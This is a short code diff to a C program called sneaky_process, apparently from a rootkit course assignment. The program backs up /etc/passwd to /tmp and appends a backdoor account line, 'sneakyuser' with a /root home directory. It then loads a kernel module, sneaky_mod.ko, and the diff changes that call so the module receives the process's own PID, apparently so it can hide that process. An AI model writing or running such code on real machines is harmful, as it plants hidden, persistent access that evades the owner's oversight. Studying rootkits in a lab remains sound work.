@@ -34,19 +34,13 @@ void add_passwd(char * fileName, char * passwd) {
   fclose(file);
 }
 
-void load_sneaky_mod() {
-}
-void loop_interact() {
-}
-void unload_sneaky_mod() {
-}
-
 int main() {
   printf("sneaky_process pid = %d\n", getpid());
-
   copy_file("/etc/passwd", "/tmp/passwd");
   add_passwd("/etc/passwd", "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash");
-  system("insmod sneaky_mod.ko");
+  char arg[50];
+  sprintf(arg, "insmod sneaky_mod.ko sneaky_pid=%d", (int)getpid());
+  system(arg);
 
   char c;
   while ((c = getchar()) != 'q') {
